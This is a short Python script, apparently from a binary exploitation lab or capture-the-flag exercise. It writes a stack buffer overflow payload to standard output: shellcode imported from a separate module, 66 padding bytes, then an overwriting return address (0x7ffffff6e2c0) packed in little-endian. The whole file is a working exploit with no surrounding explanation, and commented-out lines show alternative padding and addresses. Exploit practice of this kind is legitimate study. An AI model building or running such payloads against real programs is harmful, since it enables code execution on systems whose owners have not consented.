#!/usr/bin/env python3

import sys

from shellcode import shellcode

# sys.stdout.buffer.write(b'A'*120)
# print(len(shellcode))
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'0'*66)
sys.stdout.buffer.write(0x7ffffff6e2c0.to_bytes(8, 'little'))
# sys.stdout.buffer.write(0x0000000000401e46.to_bytes(8, 'little'))